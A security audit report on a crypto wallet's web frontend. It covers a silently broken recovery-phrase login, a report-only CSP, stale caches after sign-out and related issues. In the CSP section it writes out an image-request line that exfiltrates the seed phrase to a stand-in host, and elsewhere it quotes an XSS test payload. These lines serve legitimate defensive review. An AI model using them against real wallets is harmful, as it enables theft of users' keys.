# Frontend Security Review — 2026-08-14

**Baseline:** `dev` at the `v1.35.0` tag (`922867c6`).
**Scope:** `web/frontend/` in full — 322 source files, 142k lines: key custody, transaction construction and signing, the API and session layer, all four themes' content rendering, build configuration, and the browser-hardening headers that `deploy/templates/caddy/Caddyfile` actually serves for this origin.
**Reporting bar:** all severities. Unlike the [2026-08-13 sweep](../2026-08-13/cross-component-review.md), Medium, Low and Informational findings are recorded.
**Method:** six parallel component audits, each required to produce a concrete exploit or failure path rather than a pattern match, followed by independent re-verification of every surviving candidate against source by the reviewer. Four candidates were dropped on re-verification and are recorded under "Candidates that did not survive", because a review is only as trustworthy as the claims it throws away.

**Prior state.** The [2026-08-07 review](../2026-08-07/frontend-review.md) and its [2026-08-09 retest](../2026-08-09/frontend-retest.md) are the previous frontend rounds. Per instruction, items already recorded as accepted decisions in [`open-items.md`](../open-items.md) are out of scope and are not re-argued here: the plaintext `insecure` seed-storage default, the Photon/wsrv thumbnail proxies (L-1), and the removal of the click-to-load media gate (L-4). They are treated as settled premises — in fact the plaintext default is what makes several judgements below stricter, not looser.

---

## Summary

**1 High, 2 Medium, 2 Low, 1 Informational. Nothing Critical.** No fix has been applied; this document is review only.

| ID | Finding | Severity | Status |
| :-- | :-- | :-- | :-- |
| **H-1** | "Sign in with recovery phrase instead" cannot restore a password or passkey vault, and fails silently | High | Open |
| **M-1** | CSP has been Report-Only since the day it shipped, and no collector exists, so the soak that would end it can never conclude | Medium | Open |
| **M-2** | `onSessionReset` has no subscribers; sign-out leaves per-tab feed, API and `sessionStorage` caches populated | Medium | Open |
| **L-1** | Cross-tab sign-out locks the sibling tab's vault but does not drain its queue | Low | Open |
| **L-2** | Signed request bodies are narrower than the fields the backend acts on | Low | Open |
| **I-1** | The lint gate covers 7 of 322 source files | Informational | Open |

IDs are local to this document. In [`open-items.md`](../open-items.md) the High is filed as **H-3 (08-14)** to avoid colliding with the two indexer Highs of the same date, and the rest are suffixed `(fe)`.

Two of these are also **bookkeeping corrections to the 2026-08-09 retest**, which matters because that retest is what `open-items.md` currently cites as authoritative:

1. **M-1 was recorded as "Closed (report-only)".** Report-only is a milestone, not a closure, and the rollout has no mechanism to finish — see M-1.
2. **The 2026-08-07 review's M-7 was never closed; a different item was recorded under its ID.** The review's M-7 is "the decrypted phrase is duplicated in App state and reveal requires no step-up". The retest's closure map lists M-7 as "Sign-out incomplete", and separately lists M-5 as "Incomplete session reset" — two rows describing session reset, and the real M-7 absent. Its substance is unfixed and is folded into M-2 below.

**The headline is H-1**, and it is not an attacker-driven finding. It is the wallet's only in-app recovery route for a user who has forgotten their vault password or lost their passkey, it is deterministically broken for every such user, and the failure produces no error message. It fails closed — no transaction is signed by the wrong account — so it costs availability and trust rather than funds.

**Clean where it counts most.** The content rendering surface produced no injection finding. With the plaintext seed default accepted, the absence of an HTML/script sink is the single load-bearing control on this origin, so the sinks that were enumerated and cleared are listed in full rather than summarised.

---

## H-1 (High) — the vault recovery path is broken, and it is broken silently

**Component:** `web/frontend/src/App.js`, `src/logic/useLogin.js`, `src/utils/SeedVault.js`. **Affects:** every user in `password` or `passkey` vault mode. **Not** the `insecure` default. **Trigger:** clicking the recovery link that the unlock screen itself offers. **Effect:** a logged-in-looking session in which every signature fails, and, for a user who cannot unlock, an inescapable loop.

Both protected vault modes present the same escape hatch on the unlock overlay, in all four themes:

```227:229:web/frontend/src/themes/default/components/UnlockPrompt.js
                    <LinkText type="button" onClick={onFallbackLogin}>
                        Sign in with recovery phrase instead
                    </LinkText>
```

### Why it always fails

The handler deliberately clears the in-memory key material before routing to `/login`, so that the login page cannot leak a still-unlocked session:

```1002:1019:web/frontend/src/App.js
    handleFallbackLogin = () => {
        // Lock the vault (clear in-memory secrets) but keep the encrypted blobs
        // in localStorage so the login page can offer a link back to the unlock screen.
        ...
        seedVault.lock();
        this.setState({ vaultLocked: false, seedPhrase: '', publicKey: '', username: '' }, () => {
```

`lock()` nulls exactly the two cached keys that the store path will need a moment later:

```427:431:web/frontend/src/utils/SeedVault.js
    lock() {
        this._seed = null;
        this._pwdKeyBytes = null;
        this._prfKeyBytes = null;
    }
```

The user then enters a valid phrase, and `useLogin` commits it (`useLogin.js:80`). `setCredentials` writes the identity to `localStorage` first and then attempts the vault write — always with a `null` secret, because there is nowhere in this flow for a password to come from:

```800:811:web/frontend/src/App.js
        // Store seed through SeedVault. Never silently downgrade to insecure on error —
        // preserve the previous vault and surface the failure.
        if (seedPhrase) {
            const mode = seedVault.getMode() || 'insecure';
            seedVault.storeSeed(seedPhrase, mode, null).catch((e) => {
                console.error('[SeedVault] Failed to store seed (vault unchanged):', e?.message || e);
                try {
                    window.dispatchEvent(new CustomEvent('seedVaultStoreFailed', {
                        detail: { message: String(e?.message || e || 'Failed to store recovery phrase') },
                    }));
                } catch (_) { /* noop */ }
            });
        }
```

`getMode()` still returns `password` (or `passkey`) — the encrypted blob was deliberately preserved. With `secret` null and the cached key just nulled by `lock()`, both branches reach their terminal `throw`:

```301:314:web/frontend/src/utils/SeedVault.js
            } else if (this._pwdKeyBytes) {
                // Re-encrypt with the cached key (e.g. setCredentials called during session)
                keyBytes = this._pwdKeyBytes;
                ...
            } else {
                throw new Error('Password required for password mode');
            }
```

```329:330:web/frontend/src/utils/SeedVault.js
            const keyBytes = secret || this._prfKeyBytes;
            if (!keyBytes) throw new Error('PRF key required for passkey mode');
```

This is not a race and not an edge case. `secret` is a literal `null` at the only call site that runs after a login, and `_pwdKeyBytes`/`_prfKeyBytes` are unconditionally nulled two navigations earlier. It fails 100% of the time, in both protected modes.

### Why the user is never told

The rejection is converted into a `seedVaultStoreFailed` DOM event. **Nothing in the tree listens for it** — the dispatch above is the only occurrence of that string in the entire repository. The comment claims the failure is surfaced; it is not.

### The resulting state

`Storage.save('publicKey', …)` and `Storage.save('username', …)` have already run (`App.js:798-799`), so the UI renders as signed in. But `_seed` was never assigned, and for a protected mode `getSeed()` has no fallback — only `insecure` auto-loads from storage:

```159:175:web/frontend/src/utils/SeedVault.js
    getSeed() {
        // If already unlocked, return from memory
        if (this._seed) return this._seed;

        // For insecure mode, auto-load from localStorage
        const mode = this.getMode();
        if (mode === 'insecure') {
            const raw = Storage.load(KEY_PLAINTEXT, '');
            if (raw) {
                this._seed = raw;
                return raw;
            }
        }

        // All other modes require explicit unlock
        return null;
    }
```

Every signing path reads the vault through `getSeed()` — `signPlain.js:13` for authenticated reads, and `TransactionHandler._requireOwnerBinding` at `:272` for every transaction — so all of them now raise `missing recovery phrase` and drain the queue. The correct, validated mnemonic the user just typed survives only in `App.state.seedPhrase`, with no durable home.

On reload the app finds the vault still locked, re-shows the unlock overlay, and offers the same broken link. A user who remembers the password recovers normally. **A user who does not — precisely the user this control exists for — cannot get a working session in that browser profile, despite holding the correct recovery phrase.** Their funds are not lost; the phrase still works in a fresh profile or after manually clearing site data. But the wallet gives them no way to discover that, and no error to search for.

### Severity

High. It is the sole in-app recovery mechanism for protected custody, it is deterministically non-functional rather than flaky, and the silent failure is what elevates it: the user cannot distinguish a broken vault transition from a backend outage. It is not Critical because it fails closed — no wrong-account signature is produced, no secret reaches a third party, and the underlying key material is untouched.

Scoping note for the operator, stated plainly because it cuts the other way: the affected population is only those users who deliberately left the `insecure` default. If that population is currently near zero, the practical urgency is lower than the severity label suggests — but the defect is in the code path that a security-conscious user is specifically steered toward.

### Suggested fix

Two independent changes, both small. First, give the fallback login somewhere to put the seed: either carry the mode transition explicitly (prompt for the password again and pass it as `secret`), or write to `memory` mode and ask the user to re-establish the vault from settings. Second, add a listener for `seedVaultStoreFailed` so that a vault write failure is a visible error rather than a console line. A regression test should assert that after `handleFallbackLogin` followed by a valid `setCredentials`, `seedVault.getSeed()` is non-null.

---

## M-1 (Medium) — the CSP soak has no end condition, and no collector

**Status: M-1 from the 2026-08-07 review is not closed.** The 2026-08-09 retest recorded it as "Closed (report-only)".

The wallet origin serves exactly one CSP header, and it is the reporting variant:

```164:165:deploy/templates/caddy/Caddyfile
			# Report-only first; enforce after UAT soak (see frontend security remediation).
			Content-Security-Policy-Report-Only "default-src 'self'; script-src 'self'; worker-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self'; connect-src 'self' https://api.giphy.com; img-src 'self' data: blob: https:; media-src 'self' blob: https:; frame-src https://www.youtube.com https://youtube.com https://www.redgifs.com https://redgifs.com https://rumble.com https://www.rumble.com https://iframe.cloudflarestream.com https://*.cloudflarestream.com https://videodelivery.net; object-src 'none'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'; manifest-src 'self'; upgrade-insecure-requests"
```

Verified: there is no enforcing `Content-Security-Policy` header anywhere in the repository, and the report-only header has been unchanged since `324b2d92` introduced it on 2026-08-09.

**The part that makes this a finding rather than a schedule slip: there is no `report-uri`, no `report-to`, and no `Reporting-Endpoints` header anywhere in `deploy/`.** Browsers are computing violations and discarding them. The stated exit criterion — "enforce after UAT soak" — depends on evidence that is not being collected anywhere, so the soak cannot conclude on its own. This is not a staged rollout in progress; it is a permanent no-op with a comment describing a plan.

**Impact.** CSP is the second layer here, not the first. The rendering audit below found no injection sink, so nothing today walks through the open door. But the accepted plaintext-seed default means the consequence of *any* future script execution on this origin is total wallet compromise, and CSP is the only control that would blunt it. That is exactly the situation where defense in depth is supposed to already be in place rather than pending.

**A second observation, for whenever the flip happens: the drafted policy would not stop seed exfiltration.** `script-src 'self'` is strong and would block injected script tags and `eval`. But `img-src 'self' data: blob: https:` and `media-src 'self' blob: https:` permit a request to any HTTPS host, and exfiltration does not need `fetch` — `new Image().src = 'https://collect.example/?d=' + seed` is unaffected by `connect-src`. Tightening `img-src`/`media-src` to the host allowlist that `mediaPolicy.js` already maintains would close that, at a functional cost that needs weighing against the accepted media-privacy decisions.

**Severity: Medium.** Reaching it requires a second, currently-absent bug. Recorded as Medium rather than High for that reason, and not as Low because the asset behind the door is the user's key.

**Also missing, minor:** `Cross-Origin-Opener-Policy` and `Cross-Origin-Resource-Policy`. `Strict-Transport-Security` is not set explicitly, though Caddy adds it automatically on TLS sites. `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Permissions-Policy` and `Referrer-Policy` are all present and enforced — anti-framing is genuinely closed, and the deliberate `strict-origin-when-cross-origin` choice for YouTube is respected here as an accepted decision.

---

## M-2 (Medium) — the session-reset contract is declared but not subscribed to

`sessionLifecycle.js` opens by stating the invariant the whole module exists to enforce:

```1:4:web/frontend/src/utils/sessionLifecycle.js
/**
 * Session generation + reset coordination.
 * All account-bound async work must check getSessionGeneration() before writing state.
 */
```

It exports a subscription hook for exactly that purpose:

```22:25:web/frontend/src/utils/sessionLifecycle.js
export function onSessionReset(listener) {
    listeners.add(listener);
    return () => listeners.delete(listener);
}
```

**`onSessionReset` has zero subscribers.** So does the `mirage:session-reset` window event it dispatches. `TransactionHandler` is the only consumer of the generation counter, and it reads it directly. Every other account-bound cache is on its own, and several are not cleared by anything:

- **The feed cache is keyed by topic, not by account, and nothing clears it.** `writeMemFeedState` stores rendered posts — including the viewer's own `user_vote` — on a `window` global (`useMain.js:36-46`) that no reset path touches.
- **`resetApiSession` aborts in-flight requests but leaves completed responses cached.** It clears `sessionControllers` (`api.js:43-52`) and never touches `responseCache` (`api.js:255`) or `inflight` (`:253`), and the cache-hit branch at `:270` does not compare generations.
- **Sign-out clears `localStorage` only.** `useSignOut` calls `resetClientSession`, which calls `Storage.clear()` — `localStorage` alone. `Storage.hardResetAllStorage()` exists and clears `sessionStorage` too (`Storage.js:125-139`), but sign-out does not use it, so `feed_order_*`, `feed_scroll_*`, `mirage_came_from_feed` and the `_seenPending` batch all survive.
- **`App.state.posts` is not cleared** by sign-out, and `ProfileCache.pendingRequests` and the `UsernameCache` in-memory map have no reset hook.

**Impact.** On a shared device, account B in the same tab can be served account A's personalized feed and vote highlights until a refetch replaces them, and A's queued seen-post batch can flush under B's session. This is a cross-account privacy and isolation failure. It is not key exposure and it does not survive a page refresh for the in-memory caches.

**This is the unfinished remainder of the 2026-08-07 M-5**, which the 2026-08-09 retest recorded as closed. The abort-generation half genuinely shipped and works; the cache-clearing half did not.

**Folded in here: the real M-7.** The decrypted phrase is still duplicated into top-level React state (`App.js:212`, `:795`, `:995`) and passed down to route components, and reveal/copy in all four `SettingsView`s takes one click with no re-authentication. The step-up primitive was written and never wired — `requireFreshUnlock` at `SeedVault.js:399-403` has no callers anywhere in the tree. For the `insecure` default this changes nothing, since the phrase is in `localStorage` regardless; it matters only in the protected modes, where limiting the phrase's residency is the entire point of the vault. Low on its own; recorded here because it was marked closed under an ID that describes a different item.

---

## L-1 (Low) — cross-tab sign-out does not drain the sibling tab's queue

Signing out in one tab broadcasts through `localStorage`, and the receiving tab's handler does the minimum:

```394:397:web/frontend/src/App.js
        this._removeCrossTabWatcher = installCrossTabSessionWatcher(() => {
            try { seedVault.lock(); } catch (_) { /* noop */ }
            this.setState({ publicKey: '', username: '', seedPhrase: '' });
        });
```

No `resetClientSession`, no `cancelAll`, no generation bump. The sibling tab keeps its queue, its pending maps and any running PoW worker.

**It fails closed, which is why this is Low.** I chased the stronger version of this — that a private key captured into the processing closure before a 60-second PoW could still sign afterwards — and it does not hold. `handleTransactionResult` re-verifies the owner binding immediately before signing, after PoW has completed:

```3906:3910:web/frontend/src/utils/TransactionHandler.js
    async handleTransactionResult(proof, transaction, challenge, privateKeyHex, signerAddress, resolve) {
        if (transaction?.owner && !this._verifyOwnerBinding(transaction, 'sign')) {
            resolve(cancelResult(this._lastOwnerVerifyReason || 'owner_mismatch'));
            return;
        }
```

That verification re-derives from `seedVault.getSeed()`, which returns null in the sibling tab — the watcher locked the in-memory copy, and the signing-out tab's `Storage.clear()` already removed the plaintext key from the shared `localStorage`, so even the `insecure` auto-load path finds nothing. The entry is cancelled and the queue drained.

**What remains is genuinely small.** Until the next dequeue attempt the sibling tab's pending spinners and promises are not settled. And because that tab's session generation was never bumped, a queued intent that predates the sign-out still matches `entry.sessionGeneration` if the user logs back into **the same** account in that tab, and will then execute. Cross-account execution is blocked by the owner comparison at `TransactionHandler.js:305`.

Fix is one line: have the cross-tab watcher call `resetClientSession({ lockVault: true })` — or at minimum `tx.cancelAll` — instead of `seedVault.lock()` alone.

---

## L-2 (Low) — signed request bodies are narrower than the fields the backend acts on

The relay envelope for `MsgSetUsername` signs the username and envelope metadata:

```3959:3968:web/frontend/src/utils/TransactionHandler.js
                const canon = this.canonicalSetUsername({
                    pub_bytes: pubBytes,
                    last_block_hash: transaction.last_block_hash,
                    difficulty: difficulty,
                    proof: Number(proof),
                    timestamp: transaction.timestamp,
                    target: signerAddress,
                    username: transaction.username || "",
                    nonce: envelopeNonce,
                });
```

Two attribution fields are then attached to the POST body after the signature is computed:

```3984:3989:web/frontend/src/utils/TransactionHandler.js
                if (transaction.invite_code) {
                    toRelay.invite_code = transaction.invite_code;
                }
                if (transaction.referrer_username) {
                    toRelay.referrer_username = transaction.referrer_username;
                }
```

The backend acts on both: it validates the code, marks `invite_codes.used_by`, resolves the referrer and drives the referral reward path (`web/backend/routes/core.py:968-1336`). The same shape appears on several backend-signed endpoints, where the action string, timestamp and nonce are signed but the parameters are not — `seen_posts`' `posts` array, `resolve_report`'s `id`, `admin_rewards_suspend`'s `target` and `duration_days`, and the `admin/stats/aggregate` window.

**Why this is Low and not higher.** None of these fields reach the chain; they are all backend-side bookkeeping. The party that verifies the signature is the same party that acts on the field and owns the reward ledger, so a malicious backend gains nothing by tampering — it can already write the rows directly. The only actor positioned to exploit the gap is a TLS-terminating intermediary, which here means the CDN. Cross-action replay is closed because the action string is inside the signed payload, and write endpoints consume a nonce through `push_nonces`.

Recorded as a design note rather than a bug to chase: signed-payload coverage should match the acted-upon body, so that the property holds by construction if a relay ever becomes a third party. If only one is changed, `invite_code` is the one with money attached — the 2026-08-13 H-5 investigation put invite rewards at 10k MIRAGE per side.

---

## I-1 (Informational) — the lint gate covers 7 of 322 source files

```33:33:web/frontend/package.json
        "lint": "eslint src/utils/onboardingSession.js src/utils/sessionLifecycle.js src/utils/mediaPolicy.js src/utils/CryptoUtils.js src/logic/useLogin.js src/logic/useWelcome.js src/logic/useSignOut.js tests scripts --max-warnings=0",
```

CI runs this and it passes with zero warnings, which reads as a green gate over the frontend. It is a green gate over roughly two percent of it. `TransactionHandler.js`, `SeedVault.js`, `App.js`, `api.js` and every theme file are outside it. The file list looks like it was narrowed to the files touched by the 2026-08-09 hardening work so that `--max-warnings=0` could be adopted immediately, which is a reasonable way to start; leaving it that way means the strictness is mostly symbolic.

Related coverage gaps, none of which are findings on their own: no test asserts any response header (so an accidental removal of `X-Frame-Options` or the CSP would merge silently), `check:repro` exists but is not wired into CI, and `npm audit` gates at `high` so the two moderate React Router advisories do not surface.

---

## Rendering surface — no injection finding

This section is longer than a clean result normally warrants, because the accepted plaintext-seed default makes it the control everything else rests on. Any HTML or script injection on this origin is immediate and total wallet compromise, so the sinks were enumerated exhaustively rather than sampled.

**Zero occurrences** across all of `src/` and `public/` of: `dangerouslySetInnerHTML`, `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval(`, `new Function(`, `srcdoc`, and `setTimeout`/`setInterval` with a string argument. The only textual `eval` hit is the WebAuthn `prf: { eval: … }` extension parameter in `SeedVault.js`, which is a platform API field name.

Every `document.createElement` call was adjudicated: HLS `<source>` construction in `InlineMedia` (scheme-checked URL), the download anchor in `media.js` (http(s) only), the caret-mirror `div` in `MarkdownEditor` (assigns `textContent`, not HTML), the canvas/video elements in the upload helpers, and transient textareas for clipboard copy. None accepts markup.

The markdown pipeline is safe by configuration rather than by filtering, which is the stronger arrangement. `react-markdown` is used without `rehype-raw`, so a raw HTML node is rewritten to a text node — `<img src=x onerror=alert(1)>` in a post body renders as literal text. Its `defaultUrlTransform` runs over every URL attribute and permits only `http`, `https`, `irc`, `ircs`, `mailto` and `xmpp`, so `javascript:` and `data:text/html` links resolve to an empty `href`. The custom `remarkSpoiler`, `remarkMentions` and `remarkHashtags` plugins emit `data.hName` component nodes rather than HTML nodes, and their capture regexes (`@([A-Za-z0-9-]+)`, `#([a-zA-Z0-9]{3,50})`) cannot escape a path segment; hashtags are additionally `encodeURIComponent`'d.

Iframe embeds are built from regex-extracted provider IDs interpolated into fixed origins (YouTube, Redgifs, Rumble, Cloudflare Stream), never from an attacker-supplied URL, and carry `sandbox="allow-scripts allow-same-origin allow-presentation"` without `allow-top-navigation`. `InlineMedia` refuses to render at all when `classifyMediaUrl` rejects the scheme, embedded credentials or control characters (`mediaPolicy.js:80-83`), and that rejection is pinned by `tests/unit/mediaPolicy.test.js`. External links carry `rel="noopener noreferrer"`.

Two sub-threshold notes, neither an injection path, recorded only so they are not rediscovered as findings: protocol-relative markdown links (`[x](//evil.example)`) pass `defaultUrlTransform` because it treats a colon-free value as relative, which is a phishing-grade navigation issue rather than script execution; and `SearchDropdown`'s `getPostThumbnail` renders a post-supplied thumbnail URL without routing through `classifyMediaUrl` or the thumbnail proxy, making it inconsistent with the feed but not dangerous, since browsers do not execute script from an `<img>`-loaded SVG.

---

## Also examined and adequately guarded

- **Transaction owner binding holds on every path, including the onboarding handoff.** `_stampQueueEntry` records an immutable owner and session generation at enqueue (`TransactionHandler.js:413-427`); `_verifyOwnerBinding` re-checks at dequeue (`:2139`), pre-sign (`:2597`), and sign (`:3907`, `:5152`); a mismatch drains the entire queue, releases reservations, resolves every promise and terminates the PoW worker (`:373-401`). The handoff path derives the owner from the handoff seed and cross-checks it against the stored owner (`:261-270`). All enqueue paths route through `_pushStampedTransaction` or `_enqueueBoundTransaction`; there is exactly one bare `transactions.push`, inside the former. The 2026-08-07 H-4 closure is intact.
- **Mnemonic validation before every derivation.** `requireValidMnemonic` calls `validateMnemonic` before `mnemonicToSeedSync` and is on every derivation entry point (`CryptoUtils.js:18-31`). This is what stops the empty mnemonic — which derives a valid, globally known account — from ever reaching a signature.
- **Envelope nonces come from a CSPRNG.** `generateEnvelopeNonce` throws rather than degrading when `crypto.getRandomValues` is unavailable (`canonicalEncoding.js:4-11`). The one `Math.random` in the transaction path picks a PoW search starting point and has no security role.
- **Vault transitions encrypt before clearing.** `storeSeed` builds and verifies the replacement blob before `_clearAllStoredSeeds()` in both protected branches (`SeedVault.js:316-318`, `:339-340`), and `setCredentials` no longer downgrades to plaintext on error — it preserves the existing vault. The 2026-08-07 H-3 closure holds; H-1 above is the *opposite* failure of the same code, correctness of the no-downgrade rule at the cost of a reachable dead end.
- **Onboarding secrets stay out of history.** Router state carries only `handoffId`, `fromRecovery` and `username`; the seed lives in an in-memory `Map` with a 15-minute TTL, purpose binding, and clearing on session reset. Pinned by `tests/unit/onboardingSession.test.js`. H-2 holds.
- **PoW supply chain.** Argon2 JS and WASM are vendored under `public/pow/` and hash-pinned by `MANIFEST.txt`; the worker's `importScripts` is same-origin; `check:pow-assets` and `check:bundle-policy` both enforce it in Docker and CI. The worker receives only hex parameters — no seed material. M-4 holds.
- **No third-party script on the wallet origin.** `index.html` loads only same-origin assets; fonts are self-hosted; production source maps are off and the bundle policy rejects any `.map`. H-1 from 2026-08-07 (GTM) holds, pinned by `noGtm.test.js` and an e2e check.
- **Admin UI is not the authorization boundary.** Reports, quest administration and stats all gate the *result* server-side on `get_user_level >= 100` plus a verified signature; the client values only hide chrome. I-2 holds.

---

## Candidates that did not survive re-verification

Recorded because a clean result is only meaningful if the failed attempts are visible, and because three of these were confidently proposed by the parallel audits.

- **"In-flight PoW keeps signing after a cross-tab sign-out, using a private key captured in the closure."** Refuted. The owner binding is re-verified *after* PoW completes, at the top of `handleTransactionResult` (`:3907`), and it re-derives from the vault, which is empty by then. Downgraded to L-1.
- **"Duplicating a tab bypasses auto-lock, leaving the seed unlocked indefinitely."** Refuted. A duplicated tab is a fresh JavaScript context: `_seed` starts null, `isLocked()` returns true for protected modes, and the unlock overlay is shown. Two independently unlocked tabs each run their own auto-lock interval against their own activity timestamp, so neither extends the other's lifetime.
- **"`peekHandoffByPurpose` picks the newest handoff, so two concurrent signups sign with the wrong seed."** Refuted. A genuinely different signup has a different owner, and `_requireOwnerBinding` throws `handoff owner mismatch` (`TransactionHandler.js:268-270`). A same-owner collision resolves to the same seed and has no effect.
- **"Unsigned `invite_code` is a High-severity tamper gap."** Downgraded to L-2. The verifying party and the acting party are the same backend, so tampering yields nothing that party could not already do directly.
- **"CometBFT-style unsigned admin parameters allow privilege escalation."** Dropped. Every admin endpoint re-derives the actor from the signature and independently checks the level; a client cannot gain a privilege it does not have by reshaping the body.

---

## Verification performed

All commands run from `web/frontend` at `v1.35.0`. No file was modified; no production system was contacted.

```bash
cd web/frontend
npm run lint                 # passed, 0 warnings — but see I-1 for what it covers
npm run test                 # 8 files, 23 tests, all passed
npm run check:pow-assets     # ok (argon2-browser@1.18.0, 2 assets)
VITE_APP_VERSION=secreview VITE_API_BASE=/api npm run build   # built in 4.12s
npm run check:bundle-policy  # ok (36 files scanned)
npm audit --audit-level=high # 0 critical, 0 high, 2 moderate
```

The two moderate advisories are both `react-router` 6.30.4: an open-redirect via backslash in `Link`/`useNavigate`, and arbitrary constructor injection via `deserializeErrors()` during SSR hydration. **The SSR one is unreachable** — this is a client-rendered Vite app with `BrowserRouter` and no hydration path. The open-redirect needs a router target built from user input, and the mention and hashtag plugins constrain their path segments to `[A-Za-z0-9-]` and `encodeURIComponent` respectively. The fix is a major-version bump to 7.x, which is a breaking change and not warranted by these two.

Not run: the Playwright e2e suite, which needs a browser download. It pins the absence of third-party script requests against a preview server, which `check:bundle-policy` and `noGtm.test.js` already cover statically.

**H-1 was verified by source trace rather than by execution** — the throw is unconditional given a `null` secret and a nulled cached key, both of which are established by literal assignments two navigations apart, so there is no state in which it does not fire. A browser reproduction (switch to password mode in settings, reload, click "Sign in with recovery phrase instead", enter the correct phrase, then attempt any action) is the natural regression test and is the recommended next step before the fix.

---

## Assumptions

- The recovery phrase is the account's durable signing authority; plaintext storage as the default is an accepted product decision and is treated as a fixed premise, not a finding.
- The backend and the frontend are operated by the same party, which is what bounds L-2. If a third-party relay is ever introduced, L-2 should be re-rated immediately.
- CDN-added response headers may exist but are not a repository-controlled guarantee; the origin Caddy configuration is the baseline and must fail secure on its own.
- Chain and backend authorization are out of scope except where needed to decide whether a frontend issue is contained.
